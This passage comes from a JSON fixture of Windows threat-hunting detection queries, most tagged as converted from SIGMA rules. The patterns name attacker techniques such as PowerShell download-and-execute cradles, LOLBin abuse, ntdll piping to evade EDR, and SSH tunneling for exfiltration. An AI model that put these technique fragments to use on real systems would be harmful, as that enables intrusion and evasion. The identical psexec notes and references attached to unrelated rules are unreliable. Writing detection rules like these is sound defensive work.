            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"process \" and tgt.process.cmdline contains \"call \" and tgt.process.cmdline contains \"create \") and (tgt.process.cmdline contains \"rundll32\" or tgt.process.cmdline contains \"bitsadmin\" or tgt.process.cmdline contains \"regsvr32\" or tgt.process.cmdline contains \"cmd.exe /c \" or tgt.process.cmdline contains \"cmd.exe /k \" or tgt.process.cmdline contains \"cmd.exe /r \" or tgt.process.cmdline contains \"cmd /c \" or tgt.process.cmdline contains \"cmd /k \" or tgt.process.cmdline contains \"cmd /r \" or tgt.process.cmdline contains \"powershell\" or tgt.process.cmdline contains \"pwsh\" or tgt.process.cmdline contains \"certutil\" or tgt.process.cmdline contains \"cscript\" or tgt.process.cmdline contains \"wscript\" or tgt.process.cmdline contains \"mshta\" or tgt.process.cmdline contains \"\\Users\\Public\\\" or tgt.process.cmdline contains \"\\Windows\\Temp\\\" or tgt.process.cmdline contains \"\\AppData\\Local\\\" or tgt.process.cmdline contains \"%temp%\" or tgt.process.cmdline contains \"%tmp%\" or tgt.process.cmdline contains \"%ProgramData%\" or tgt.process.cmdline contains \"%appdata%\" or tgt.process.cmdline contains \"%comspec%\" or tgt.process.cmdline contains \"%localappdata%\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 298
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of different Windows based hacktools via PE metadata (company, product, etc.) even if the files have been renamed",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1588",
                "t1003"
            ],
            "name": "Hacktool Execution - PE Metadata",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.publisher=\"Cube0x0\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 299
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious PowerShell invocation command parameters",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Suspicious PowerShell Invocations - Specific - ProcessCreation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.cmdline contains \"-nop\" and tgt.process.cmdline contains \" -w \" and tgt.process.cmdline contains \"hidden\" and tgt.process.cmdline contains \" -c \" and tgt.process.cmdline contains \"[Convert]::FromBase64String\") or (tgt.process.cmdline contains \" -w \" and tgt.process.cmdline contains \"hidden\" and tgt.process.cmdline contains \"-noni\" and tgt.process.cmdline contains \"-nop\" and tgt.process.cmdline contains \" -c \" and tgt.process.cmdline contains \"iex\" and tgt.process.cmdline contains \"New-Object\") or (tgt.process.cmdline contains \" -w \" and tgt.process.cmdline contains \"hidden\" and tgt.process.cmdline contains \"-ep\" and tgt.process.cmdline contains \"bypass\" and tgt.process.cmdline contains \"-Enc\") or (tgt.process.cmdline contains \"powershell\" and tgt.process.cmdline contains \"reg\" and tgt.process.cmdline contains \"add\" and tgt.process.cmdline contains \"\\software\\\") or (tgt.process.cmdline contains \"bypass\" and tgt.process.cmdline contains \"-noprofile\" and tgt.process.cmdline contains \"-windowstyle\" and tgt.process.cmdline contains \"hidden\" and tgt.process.cmdline contains \"new-object\" and tgt.process.cmdline contains \"system.net.webclient\" and tgt.process.cmdline contains \".download\") or (tgt.process.cmdline contains \"iex\" and tgt.process.cmdline contains \"New-Object\" and tgt.process.cmdline contains \"Net.WebClient\" and tgt.process.cmdline contains \".Download\")) and (not (tgt.process.cmdline contains \"(New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1\" or tgt.process.cmdline contains \"Write-ChocolateyWarning\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 300
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects weak passwords or often abused passwords (seen used by threat actors) via the CLI.\nAn example would be a threat actor creating a new user via the net command and providing the password inline\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Weak or Abused Passwords In CLI",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"123456789\" or tgt.process.cmdline contains \"123123qwE\" or tgt.process.cmdline contains \"Asd123.aaaa\" or tgt.process.cmdline contains \"Decryptme\" or tgt.process.cmdline contains \"P@ssw0rd!\" or tgt.process.cmdline contains \"Pass8080\" or tgt.process.cmdline contains \"password123\" or tgt.process.cmdline contains \"test@202\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 301
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious start of rundll32.exe without any parameters as found in CobaltStrike beacon activity",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1202"
            ],
            "name": "Rundll32 Execution Without CommandLine Parameters",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"\\rundll32.exe\" or tgt.process.cmdline contains \"\\rundll32.exe\\\"\" or tgt.process.cmdline contains \"\\rundll32\") and (not (src.process.image.path contains \"\\AppData\\Local\\\" or src.process.image.path contains \"\\Microsoft\\Edge\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 302
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of the 'Pubprn.vbs' Microsoft signed script to execute commands.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1216"
            ],
            "name": "Pubprn.vbs Proxy Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\\pubprn.vbs\" and tgt.process.cmdline contains \"script:\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 303
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of the \"cloudflared\" tool with the tunnel \"cleanup\" flag in order to cleanup tunnel connections.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1102",
                "t1090",
                "t1572"
            ],
            "name": "Cloudflared Tunnel Connections Cleanup",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \" tunnel \" and tgt.process.cmdline contains \"cleanup \") and (tgt.process.cmdline contains \"-config \" or tgt.process.cmdline contains \"-connector-id \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 304
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of the lesser known remote execution tool named CsExec a PsExec alternative",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1587",
                "t1569"
            ],
            "name": "PUA - CsExec Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\csexec.exe\" or tgt.process.displayName=\"csexec\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 305
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detect the use of processes with no name (\".exe\"), which can be used to evade Image-based detections.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Process Launched Without Image Name",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.image.path contains \"\\.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 306
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects command that type the content of ntdll.dll to a different file or a pipe in order to evade AV / EDR detection. As seen being used in the POC NtdllPipe",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "NtdllPipe Like Activity Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"type %windir%\\system32\\ntdll.dll\" or tgt.process.cmdline contains \"type %systemroot%\\system32\\ntdll.dll\" or tgt.process.cmdline contains \"type c:\\windows\\system32\\ntdll.dll\" or tgt.process.cmdline contains \"\\ntdll.dll > \\\\.\\pipe\\\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 307
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Execution of ssh.exe to perform data exfiltration and tunneling through RDP",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1572"
            ],
            "name": "Potential RDP Tunneling Via SSH",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\ssh.exe\" and tgt.process.cmdline contains \":3389\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 308
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potentially suspicious child processes of a ClickOnce deployment application",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Potentially Suspicious Child Process Of ClickOnce Application",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\AppData\\Local\\Apps\\2.0\\\" and (tgt.process.image.path contains \"\\calc.exe\" or tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\explorer.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\net.exe\" or tgt.process.image.path contains \"\\net1.exe\" or tgt.process.image.path contains \"\\nltest.exe\" or tgt.process.image.path contains \"\\notepad.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\reg.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\schtasks.exe\" or tgt.process.image.path contains \"\\werfault.exe\" or tgt.process.image.path contains \"\\wscript.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 309
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of \"aspnet_compiler.exe\" which can be abused to compile and execute C# code.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1127"
            ],
            "name": "AspNetCompiler Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"C:\\Windows\\Microsoft.NET\\Framework\\\" or tgt.process.image.path contains \"C:\\Windows\\Microsoft.NET\\Framework64\\\") and tgt.process.image.path contains \"\\aspnet_compiler.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 310
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects inline execution of PowerShell code from a file",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Powershell Inline Execution From A File",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"iex \" or tgt.process.cmdline contains \"Invoke-Expression \" or tgt.process.cmdline contains \"Invoke-Command \" or tgt.process.cmdline contains \"icm \") and (tgt.process.cmdline contains \"cat \" or tgt.process.cmdline contains \"get-content \" or tgt.process.cmdline contains \"type \") and tgt.process.cmdline contains \" -raw\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 311
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of the built-in PowerShell cmdlet \"Enable-WindowsOptionalFeature\" used as a Deployment Image Servicing and Management tool.\nSimilar to DISM.exe, this cmdlet is used to enumerate, install, uninstall, configure, and update features and packages in Windows images\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Potential Suspicious Windows Feature Enabled - ProcCreation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"Enable-WindowsOptionalFeature\" and tgt.process.cmdline contains \"-Online\" and tgt.process.cmdline contains \"-FeatureName\") and (tgt.process.cmdline contains \"TelnetServer\" or tgt.process.cmdline contains \"Internet-Explorer-Optional-amd64\" or tgt.process.cmdline contains \"TFTP\" or tgt.process.cmdline contains \"SMB1Protocol\" or tgt.process.cmdline contains \"Client-ProjFS\" or tgt.process.cmdline contains \"Microsoft-Windows-Subsystem-Linux\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 312
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects when a possible suspicious driver is being installed via pnputil.exe lolbin",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1547"
            ],
            "name": "Suspicious Driver Install by pnputil.exe",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"-i\" or tgt.process.cmdline contains \"/install\" or tgt.process.cmdline contains \"-a\" or tgt.process.cmdline contains \"/add-driver\" or tgt.process.cmdline contains \".inf\") and tgt.process.image.path contains \"\\pnputil.exe\")) | columns ComputerName,tgt.process.user,tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 313
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detect use of the Windows 8.3 short name. Which could be used as a method to avoid command-line detection",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1564"
            ],
            "name": "Use Short Name Path in Command Line",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"~1\\\" or tgt.process.cmdline contains \"~2\\\") and (not ((src.process.image.path in (\"C:\\Windows\\System32\\Dism.exe\",\"C:\\Windows\\System32\\cleanmgr.exe\",\"C:\\Program Files\\GPSoftware\\Directory Opus\\dopus.exe\")) or (src.process.image.path contains \"\\WebEx\\WebexHost.exe\" or src.process.image.path contains \"\\thor\\thor64.exe\" or src.process.image.path contains \"\\veam.backup.shell.exe\" or src.process.image.path contains \"\\winget.exe\" or src.process.image.path contains \"\\Everything\\Everything.exe\") or src.process.image.path contains \"\\AppData\\Local\\Temp\\WinGet\\\" or (tgt.process.cmdline contains \"\\appdata\\local\\webex\\webex64\\meetings\\wbxreport.exe\" or tgt.process.cmdline contains \"C:\\Program Files\\Git\\post-install.bat\" or tgt.process.cmdline contains \"C:\\Program Files\\Git\\cmd\\scalar.exe\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
